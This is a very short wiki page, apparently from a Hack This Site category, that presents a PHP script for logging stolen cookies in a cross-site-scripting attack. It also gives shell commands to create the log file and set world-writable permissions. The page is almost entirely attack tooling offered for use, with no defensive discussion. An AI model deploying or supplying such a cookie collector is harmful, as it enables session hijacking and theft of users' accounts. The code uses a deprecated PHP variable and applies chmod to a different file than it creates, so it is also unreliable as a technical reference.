This is a cross-site-scripting, script that steals a cookie.

    <?php
    $cookie = $HTTP_GET_VARS["cookie"];
    $file = fopen('cookielog.txt', 'a');
    fwrite($file, $cookie . "\n\n");
    ?>

    touch cookielog.txt
    chmod 777 cookielog.php

[Category:Hack This Site](Category:Hack This Site "wikilink")
<Category:Security>
